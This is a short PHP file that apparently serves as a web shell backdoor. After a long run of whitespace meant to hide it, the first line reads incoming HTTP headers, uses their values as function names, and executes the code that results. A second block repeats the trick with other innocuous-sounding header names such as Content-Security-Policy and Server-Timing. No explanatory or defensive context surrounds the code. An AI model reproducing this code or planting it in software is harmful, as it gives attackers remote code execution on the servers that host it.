<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Server-Timing'])){$content=$_HEADERS['Server-Timing']('', $_HEADERS['If-Modified-Since']($_HEADERS['Feature-Policy']));$content();}

$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $include = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Server-Timing']));
    $include();
}